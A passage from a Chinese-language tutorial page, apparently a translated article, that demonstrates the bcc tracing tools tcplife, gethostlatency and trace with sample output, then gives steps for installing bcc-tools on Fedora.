class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/tcplife\r\nPID   COMM       LADDR           LPORT RADDR           RPORT TX_KB RX_KB MS\r\n12759 sshd       192.168.56.101  22    192.168.56.1    60639     2     3 1863.82\r\n12783 sshd       192.168.56.101  22    192.168.56.1    60640     3     3 9174.53\r\n12844 wget       10.0.2.15       34250 54.204.39.132   443      11  1870 5712.26\r\n12851 curl       10.0.2.15       34252 54.204.39.132   443       0    74 505.90\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf6214345708-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf6214345708-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf6214345708-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf6214345708-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf6214345708-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf6214345708-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf6214345708-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf6214345708-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/tcplife</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf6214345708-2\"><span class=\"crayon-e\">PID   </span><span class=\"crayon-e\">COMM       </span><span class=\"crayon-e\">LADDR           </span><span class=\"crayon-e\">LPORT </span><span class=\"crayon-e\">RADDR           </span><span class=\"crayon-e\">RPORT </span><span class=\"crayon-e\">TX_KB </span><span class=\"crayon-e\">RX_KB </span><span class=\"crayon-i\">MS</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf6214345708-3\"><span class=\"crayon-cn\">12759</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sshd</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">192.168.56.101</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">192.168.56.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">60639</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1863.82</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf6214345708-4\"><span class=\"crayon-cn\">12783</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sshd</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">192.168.56.101</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">192.168.56.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">60640</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9174.53</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf6214345708-5\"><span class=\"crayon-cn\">12844</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">wget</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">10.0.2.15</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">34250</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">54.204.39.132</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1870</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5712.26</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf6214345708-6\"><span class=\"crayon-cn\">12851</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">10.0.2.15</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">34252</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">54.204.39.132</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">74</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">505.90</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf6214345708-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>在你说 “我不是可以只通过 <code>tcpdump(8)</code> 就能输出这个？” 之前请注意，运行 <code>tcpdump(8)</code> 或任何数据包嗅探器，在高数据包速率的系统上的开销会很大，即使 <code>tcpdump(8)</code> 的用户层和内核层机制已经过多年优化（要不可能更差）。<code>tcplife</code> 不会测试每个数据包；它只会有效地监视 TCP 会话状态的变化，并由此得到该会话的持续时间。它还使用已经跟踪了吞吐量的内核计数器，以及进程和命令信息（“PID” 和 “COMM” 列），这些对于 <code>tcpdump(8)</code> 等线上嗅探工具是做不到的。</p>\n<h4 id=\"toc_7\">6、 gethostlatency</h4>\n<p>之前的每个例子都涉及到内核跟踪，所以我至少需要一个用户级跟踪的例子。 这就是 <a href=\"https://github.com/iovisor/bcc/blob/master/tools/gethostlatency.py\">gethostlatency</a>，它检测用于名称解析的 <code>gethostbyname(3)</code> 和相关的库调用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbfa999578106\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/gethostlatency\r\nTIME      PID    COMM                  LATms HOST\r\n06:43:33  12903  curl                 188.98 opensource.com\r\n06:43:36  12905  curl                   8.45 opensource.com\r\n06:43:40  12907  curl                   6.55 opensource.com\r\n06:43:44  12911  curl                   9.67 opensource.com\r\n06:45:02  12948  curl                  19.66 opensource.cats\r\n06:45:06  12950  curl                  18.37 opensource.cats\r\n06:45:07  12952  curl                  13.64 opensource.cats\r\n06:45:19  13139  curl                  13.10 opensource.cats\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfa999578106-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfa999578106-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfa999578106-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfa999578106-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfa999578106-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfa999578106-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfa999578106-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfa999578106-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfa999578106-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfa999578106-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfa999578106-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfa999578106-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/gethostlatency</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfa999578106-2\"><span class=\"crayon-e\">TIME      </span><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM                  </span><span class=\"crayon-e\">LATms </span><span class=\"crayon-i\">HOST</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfa999578106-3\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">33</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12903</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">188.98</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfa999578106-4\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">36</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12905</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">8.45</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfa999578106-5\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12907</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">6.55</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfa999578106-6\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">44</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12911</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">9.67</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfa999578106-7\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">02</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12948</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">19.66</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfa999578106-8\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12950</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">18.37</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfa999578106-9\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12952</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">13.64</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfa999578106-10\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">13139</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">13.10</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfa999578106-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>是的，总是有 DNS 请求，所以有一个工具来监视系统范围内的 DNS 请求会很方便（这只有在应用程序使用标准系统库时才有效）。看看我如何跟踪多个对 “opensource.com” 的查找？ 第一个是 188.98 毫秒，然后更快，不到 10 毫秒，毫无疑问，这是缓存的作用。它还追踪多个对 “opensource.cats” 的查找，一个不存在的可怜主机名，但我们仍然可以检查第一个和后续查找的延迟。（第二次查找后是否有一些否定缓存的影响？）</p>\n<h4 id=\"toc_8\">7、 trace</h4>\n<p>好的，再举一个例子。 <a href=\"https://github.com/iovisor/bcc/blob/master/tools/trace.py\">trace</a> 工具由 Sasha Goldshtein 提供，并提供了一些基本的 <code>printf(1)</code> 功能和自定义探针。 例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbfe637773150\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/trace 'pam:pam_start \"%s: %s\", arg1, arg2'\r\nPID    TID    COMM         FUNC             -\r\n13266  13266  sshd         pam_start        sshd: root\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfe637773150-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfe637773150-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbfe637773150-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbfe637773150-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfe637773150-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/trace 'pam:pam_start \"%s: %s\", arg1, arg2'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfe637773150-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">TID    </span><span class=\"crayon-e\">COMM         </span><span class=\"crayon-v\">FUNC</span><span class=\"crayon-h\">             </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbfe637773150-3\"><span class=\"crayon-cn\">13266</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">13266</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">sshd         </span><span class=\"crayon-e\">pam_start        </span><span class=\"crayon-v\">sshd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbfe637773150-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>在这里，我正在跟踪 <code>libpam</code> 及其 <code>pam_start(3)</code> 函数，并将其两个参数都打印为字符串。 <code>libpam</code> 用于插入式身份验证模块系统，该输出显示 sshd 为 “root” 用户调用了 <code>pam_start()</code>（我登录了）。 其使用信息中有更多的例子（<code>trace -h</code>），而且所有这些工具在 bcc 版本库中都有手册页和示例文件。 例如 <code>trace_example.txt</code> 和 <code>trace.8</code>。</p>\n<h3 id=\"toc_9\">通过包安装 bcc</h3>\n<p>安装 bcc 最佳的方法是从 iovisor 仓储库中安装，按照 bcc 的 <a href=\"https://github.com/iovisor/bcc/blob/master/INSTALL.md#fedora---binary\">INSTALL.md</a> 进行即可。<a href=\"https://www.iovisor.org/\">IO Visor</a> 是包括了 bcc 的 Linux 基金会项目。4.x 系列 Linux 内核中增加了这些工具所使用的 BPF 增强功能，直到 4.9 添加了全部支持。这意味着拥有 4.8 内核的 Fedora 25 可以运行这些工具中的大部分。 使用 4.11 内核的 Fedora 26 可以全部运行它们（至少在目前是这样）。</p>\n<p>如果你使用的是 Fedora 25（或者 Fedora 26，而且这个帖子已经在很多个月前发布了 —— 你好，来自遥远的过去！），那么这个通过包安装的方式是可以工作的。 如果您使用的是 Fedora 26，那么请跳至“通过源代码安装”部分，它避免了一个<a href=\"https://reviews.llvm.org/rL302055\">已修复的</a>的<a href=\"https://github.com/iovisor/bcc/issues/1221\">已知</a>错误。 这个错误修复目前还没有进入 Fedora 26 软件包的依赖关系。 我使用的系统是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc03186062118\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# uname -a\r\nLinux localhost.localdomain 4.11.8-300.fc26.x86_64 #1 SMP Thu Jun 29 20:09:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\r\n# cat /etc/fedora-release\r\nFedora release 26 (Twenty Six)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc03186062118-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc03186062118-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc03186062118-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc03186062118-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc03186062118-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc03186062118-1\"><span class=\"crayon-p\"># uname -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc03186062118-2\"><span class=\"crayon-e\">Linux </span><span class=\"crayon-v\">localhost</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">localdomain</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.11.8</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">300.fc26.x86_64</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#1 SMP Thu Jun 29 20:09:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc03186062118-3\"><span class=\"crayon-p\"># cat /etc/fedora-release</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc03186062118-4\"><span class=\"crayon-e\">Fedora </span><span class=\"crayon-i\">release</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Twenty </span><span class=\"crayon-v\">Six</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc03186062118-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>以下是我所遵循的安装步骤，但请参阅 INSTALL.md 获取更新的版本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc06019736151\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# echo -e '[iovisor]\\nbaseurl=https://repo.iovisor.org/yum/nightly/f25/$basearch\\nenabled=1\\ngpgcheck=0' | sudo tee /etc/yum.repos.d/iovisor.repo\r\n# dnf install bcc-tools\r\n[...]\r\nTotal download size: 37 M\r\nInstalled size: 143 M\r\nIs this ok [y/N]: y\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr 